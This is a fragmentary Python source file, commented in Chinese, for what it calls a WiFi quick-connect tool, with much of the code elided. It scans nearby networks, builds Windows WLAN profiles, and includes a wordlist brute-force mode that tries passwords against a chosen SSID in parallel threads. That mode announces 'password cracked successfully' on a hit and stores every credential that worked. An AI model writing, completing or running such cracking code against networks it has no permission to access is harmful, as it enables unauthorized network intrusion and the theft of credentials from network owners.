...
def scan_wifi_networks():
    ...
    try:
        ...
        if IS_WINDOWS:
            ...
            output = decode_mixed_encoding(raw_output)
...
# 创建WiFi配置文件（Windows）- 修复版，支持包含空格的SSID
def create_wifi_profile(ssid, password=None, is_open=False):
    """创建WiFi配置文件 - 修复版"""
    if not IS_WINDOWS:
        return None
    
    # 确保SSID安全处理 - 转义XML特殊字符
...
</WLANProfile>'''.format(ssid_safe, ssid_safe)
    else:
        # 加密网络配置 - 修复版，确保WPA2-Personal配置正确
        profile_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{}</name>
    <SSIDConfig>
...
</WLANProfile>'''.format(ssid_safe, ssid_safe, password_safe)
    
    # 使用安全的文件名（替换空格和特殊字符）
    safe_filename = ssid.replace(' ', '_').replace('\\', '_').replace('/', '_').replace(':', '_')
    profile_path = os.path.join(CONFIG_DIR, f"{safe_filename}.xml")
...
# 保存成功连接的WiFi信息
def save_successful_connection(ssid, password):
    """保存成功连接的WiFi名称和密码"""
    ensure_config_dir()
...
SUCCESSFUL_PASSWORD = None  # 记录成功连接的密码

def get_wifi_interface(is_password_file_try=False):
    """获取WiFi接口实例（单例模式）"""
    ...
    with WIFI_LOCK:
        ...
        try:
            ...
            WIFI_INTERFACE = ifaces[0]
            return WIFI_INTERFACE
        except Exception as e:
            if not is_password_file_try:
                print(f"初始化WiFi接口失败: {e}")
            return None

# 尝试连接WiFi（Windows）- 改进版：修复pywifi错误并优化性能
def try_connect_windows(ssid, password, max_retries=3, is_open=False, is_password_file_try=False):
        ...
        for i in range(20):  # 最多等待10秒
            try:
                if iface.status() == const.IFACE_CONNECTED:
                    ...
                    # 保存成功连接（仅在非密码文件尝试时）
                    if not is_password_file_try:
                        save_successful_connection(ssid, password)
                    return True
            except:
                pass  # 忽略状态检查时的错误
            time.sleep(0.5)
...
# 备用连接方法 - 修复版netsh命令方式 - 增强稳定性版
def try_connect_windows_backup(ssid, password, max_retries=3, is_open=False, is_password_file_try=False):
    """简化版Windows WiFi连接方法，仅用于非并发场景"""
    if not is_password_file_try:
        print(f"❌ 无法连接到WiFi: {ssid}")
    return False

# 尝试连接WiFi（Linux）
def try_connect_linux(ssid, password, max_retries=3, is_open=False):
    """在Linux上尝试连接WiFi"""
    try:
        print(f"正在连接到 {ssid}...")
...
# 尝试使用密码连接WiFi
def try_connect_with_password(ssid, password, max_retries=3, is_open=False, is_password_file_try=False):
    ...
    if IS_WINDOWS:
        # Windows使用pywifi进行连接
        result = try_connect_windows(ssid, password, max_retries=3, is_open=is_open, is_password_file_try=is_password_file_try)
        return result
    elif IS_LINUX:
        result = try_connect_linux(ssid, password, max_retries, is_open)
...
def connect_with_password_file(ssid, password_file=None, max_workers=5):
    """并行连接WiFi - 从密码文件中读取并尝试连接 - 简化版"""
    # 使用默认密码文件或提供的文件
    ...
    for i, password in enumerate(passwords, 1):
        ...
        # 尝试连接
        if try_connect_with_password(ssid, password, max_retries=1, is_open=False, is_password_file_try=True):
            print(f"\n🎉 密码破解成功!")
            print(f"✅ 成功连接到: {ssid}")
...
# 显示成功连接的WiFi列表
def display_successful_connections():
    """显示已成功连接并保存的WiFi网络"""
...
def main():
    """主函数 - 启动WiFi连接工具"""
    print("=== 🔥 WiFi快速连接工具 - 并行增强版 🔥 ===")
    ensure_config_dir()
    
    # 全局变量：存储最近一次搜索到的WiFi网络列表
    recent_wifis = []
    ...
    while True:
        ...
        if choice == '1':
            ...
            success = try_connect_with_password(ssid, password)
            if success:
                print(f"🎉 成功连接到 {ssid}")
                save_successful_connection(ssid, password)
            else:
            ...
            if recent_wifis:
                print("\n📡 最近搜索到的WiFi网络:")
                print("-" * 60)
                for i, wifi in enumerate(recent_wifis, 1):
                    print(f"{i:2d}. SSID: {wifi['ssid'][:30]:<30} 信号: {wifi['signal']:3d}% 加密: {wifi['encryption']}")
                print("-" * 60)
                print("💡 提示：输入WiFi编号或直接输入SSID名称")
                
                user_input = input("请输入WiFi编号或SSID名称: ").strip()
                
                # 检查输入是否为数字编号
                if user_input.isdigit():
                    index = int(user_input) - 1
                    if 0 <= index < len(recent_wifis):
                        ssid = recent_wifis[index]['ssid']
            ...
            # 询问线程数
            try:
                thread_input = input("请输入并行线程数 (默认: 5，建议: CPU核心数): ").strip()
                max_workers = int(thread_input) if thread_input else 5
                if max_workers < 1:
                    max_workers = 5
                if max_workers > 20:  # 限制最大线程数
                    print("警告: 线程数过多可能导致系统负载过高，已调整为20")
                    max_workers = 20
            except ValueError:
                max_workers = 5
                print("无效输入，使用默认线程数: 5")
            
            # 执行并行破解
            success = connect_with_password_file(ssid, password_file, max_workers)
